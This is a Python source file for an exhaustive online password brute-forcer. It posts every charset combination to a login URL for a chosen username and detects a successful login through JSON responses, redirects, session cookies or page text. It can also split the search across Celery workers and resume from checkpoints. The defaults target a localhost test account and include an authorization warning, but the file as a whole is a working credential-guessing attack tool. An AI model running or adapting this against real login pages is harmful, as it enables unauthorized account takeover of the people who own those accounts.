#!/usr/bin/env python3
"""
Exhaustive brute-force tester (attempts all combinations for given charset and length range).
Safe defaults: single-threaded, rate-limited, CSV logging, checkpoint/resume capability.

WARNING: combinations grow exponentially. Use small charset and short lengths first.
Run only on systems you own or are explicitly authorized to test.
"""

import itertools
import requests
import time
import csv
import sys
import os
from math import prod
from tasks import app, brute_force_chunk
from celery import group
import math

# --- Import config ---
try:
    from config import CELERY_BROKER_URL, CELERY_RESULT_BACKEND, CHARSET, MIN_LEN, MAX_LEN, USERNAME, TARGET_URL, PASSWORD_FIELD, USERNAME_FIELD, TIMEOUT
except ImportError:
    # fallback for direct script usage
    CELERY_BROKER_URL = 'redis://localhost:6379/0'
    CELERY_RESULT_BACKEND = 'redis://localhost:6379/0'
    CHARSET = "abc"
    MIN_LEN = 1
    MAX_LEN = 5
    USERNAME = "testuser@gmail.com"
    TARGET_URL = "http://127.0.0.1:5000/signin"
    PASSWORD_FIELD = "password"
    USERNAME_FIELD = "username"
    TIMEOUT = 10



# ================== CONFIG ==================
TARGET_URL = "http://127.0.0.1:5000/signin"  # endpoint that accepts username+password
USERNAME = "testuser@gmail.com"                                 # account to attack (test account)
CHARSET = "abc"              # characters to try; change carefully
MIN_LEN = 1                                          # minimum password length to try
MAX_LEN = 4                                          # maximum password length to try (keep small!)
DELAY_SECONDS = 0.5                                  # pause between attempts (s) - be conservative
PASSWORD_FIELD = "password"                          # form field name
USERNAME_FIELD = "username"                          # form field name
PASSWORD_LIST_CHECKPOINT = "bf_checkpoint.txt"       # checkpoint file (stores last attempted pwd)
CSV_OUT = "exhaustive_bf_results.csv"                # results file
TIMEOUT = 10                                         # request timeout
# Resume from a specific password: set to None to start from beginning
RESUME_FROM = None   # e.g. "aaaz" or None
# ================ END CONFIG =================

# ----------------- safety helper -----------------
def estimate_total(charset_len, min_l, max_l):
    totals = [(charset_len ** L) for L in range(min_l, max_l + 1)]
    return sum(totals), totals

# ----------------- generator -----------------
def candidate_generator(charset, min_len, max_len, resume_from=None):

    #generates all possible passwords started is false at the start or start from a specific password
    #joins passwords into a string then send them and wait for a response

    started = resume_from is None
    for L in range(min_len, max_len + 1):
        # itertools.product returns tuples of characters; join to make strings
        for tup in itertools.product(charset, repeat=L):
            pwd = ''.join(tup)
            if not started:
                if pwd == resume_from:
                    started = True
                    yield pwd
                else:
                    continue
            else:
                yield pwd

# ----------------- attempt single password -----------------
def attempt(session, password):
    payload = {USERNAME_FIELD: USERNAME, PASSWORD_FIELD: password}
    try:
        resp = session.post(TARGET_URL, data=payload, timeout=TIMEOUT, allow_redirects=False)
    except Exception as e:
        return False, None, f"error:{e}"

    status = resp.status_code
    success = False
    reason = ""

    # 1) JSON check (best)
    try:
        j = resp.json()
        if isinstance(j, dict) and j.get("success") is True:
            return True, status, "json_success"
        reason = j.get("reason") if isinstance(j, dict) else reason
    except Exception:
        pass

    # 2) Redirect check (common)
    if status in (301, 302, 303, 307):
        loc = (resp.headers.get("Location") or "").lower()
        if any(k in loc for k in ("dashboard", "profile", "home")):
            return True, status, f"redirect->{loc}"

    # 3) Cookie check — did server set a session cookie?
    # session is requests.Session so cookies are stored there after post
    if any(k in session.cookies.get_dict() for k in ("session", "sessionid", "flask_session")):
        return True, status, "session_cookie_set"

    # 4) Body content check — change keywords to match your app
    body = resp.text or ""
    if "Login successful!" in body or USERNAME in body or "Welcome" in body:
        return True, status, "body_contains_success"

    # otherwise: treat as failure
    return False, status, reason or "no_success_indicators"


# --- Helper: split prefixes for chunking ---
def get_prefixes(length, num_workers):
    charset_size = len(CHARSET)
    if length <= 2 or charset_size ** length <= num_workers:
        return [""]
    prefix_len = min(length, math.ceil(math.log(num_workers) / math.log(charset_size)))
    return ["".join(p) for p in itertools.product(CHARSET, repeat=prefix_len)]

# --- Celery Task: chunked brute-force ---


# --- Distributed main ---
def distributed_bruteforce(num_workers):
    print(f"Distributed brute-force: charset={CHARSET}, min_len={MIN_LEN}, max_len={MAX_LEN}, workers={num_workers}")
    for length in range(MIN_LEN, MAX_LEN + 1):
        prefixes = get_prefixes(length, num_workers)
        print(f"Length {length}: {len(prefixes)} chunks")
        tasks = [
            brute_force_chunk.s(
                USERNAME, TARGET_URL, PASSWORD_FIELD, USERNAME_FIELD,
                CHARSET, length, prefix, TIMEOUT
            )
            for prefix in prefixes
        ]
        job = group(tasks)
        result = job.apply_async()
        print(f"Submitted {len(prefixes)} tasks for length {length}. Waiting for results...")
        found = None
        for res in result.get():
            if res:
                found = res
                break
        if found:
            print(f"+++ FOUND password: {found}")
            return found
    print("Password not found in distributed search.")
    return None

# ----------------- main runner -----------------
def main():
    charset_len = len(CHARSET)
    total, breakdown = estimate_total(charset_len, MIN_LEN, MAX_LEN)

    if not os.path.exists(PASSWORD_LIST_CHECKPOINT):
    # create an empty file
        open(PASSWORD_LIST_CHECKPOINT, "a", encoding="utf-8").close()

# Ensure CSV file exists with header (create and write header if missing)
    if not os.path.exists(CSV_OUT):
        with open(CSV_OUT, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["timestamp","username","password","status","success","reason"])
            writer.writeheader()

    print(f"Charset length: {charset_len}. Trying lengths {MIN_LEN}..{MAX_LEN}.")
    print(f"Total combinations: {total}")
    for L, cnt in enumerate(breakdown, start=MIN_LEN):
        print(f" length {L}: {cnt} combos")
    if total > 100_000_000:
        print("WARNING: total combos > 100 million. This may take a very long time.")
        print("Please reduce charset/length or use targeted wordlists. Abort now with Ctrl+C if unintended.")
        time.sleep(2)

    # handle resume
    resume = RESUME_FROM
    if os.path.exists(PASSWORD_LIST_CHECKPOINT):
        try:
            with open(PASSWORD_LIST_CHECKPOINT, "r", encoding="utf-8") as f:
                saved = f.read().strip()
                if saved:
                    resume = saved
                    print(f"Resuming from checkpoint password: {resume}")
        except Exception:
            pass
    if resume:
        print(f"Resuming from: {resume}")

    session = requests.Session()
    # open CSV writer
    csv_file_exists = os.path.exists(CSV_OUT)
    with open(CSV_OUT, "a", newline="", encoding="utf-8") as csvf:
        writer = csv.DictWriter(csvf, fieldnames=["timestamp","username","password","status","success","reason"])
        if not csv_file_exists:
            writer.writeheader()

        gen = candidate_generator(CHARSET, MIN_LEN, MAX_LEN, resume_from=resume)
        count = 0
        start_time = time.time()
        for pwd in gen:
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            success, status, reason = attempt(session, pwd)

            # write attempt
            writer.writerow({
                "timestamp": ts,
                "username": USERNAME,
                "password": pwd,
                "status": status,
                "success": success,
                "reason": reason
            })
            csvf.flush()   # flush each write so progress is saved
            count += 1

            # update checkpoint (so we can resume later)
            try:
                with open(PASSWORD_LIST_CHECKPOINT, "w", encoding="utf-8") as ck:
                    ck.write(pwd)
            except Exception:
                pass

            # console output
            elapsed = time.time() - start_time
            tries_per_sec = count / elapsed if elapsed > 0 else 0
            print(f"[{ts}] tried: {pwd} -> success={success} status={status} reason={reason}  total_tried={count} rate={tries_per_sec:.2f}/s")

            if success:
                print("+++ FOUND password:", pwd)
                # optionally remove checkpoint to indicate finished
                try:
                    os.remove(PASSWORD_LIST_CHECKPOINT)
                except Exception:
                    pass
                break

            # polite delay between attempts
            time.sleep(DELAY_SECONDS)

    print("Finished. Attempts:", count)

# --- CLI Entrypoint ---
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--distributed", action="store_true", help="Use distributed Celery brute-force")
    parser.add_argument("--workers", type=int, default=4, help="Number of workers/chunks")
    args = parser.parse_args()
    if args.distributed:
        distributed_bruteforce(args.workers)
    else:
        main()
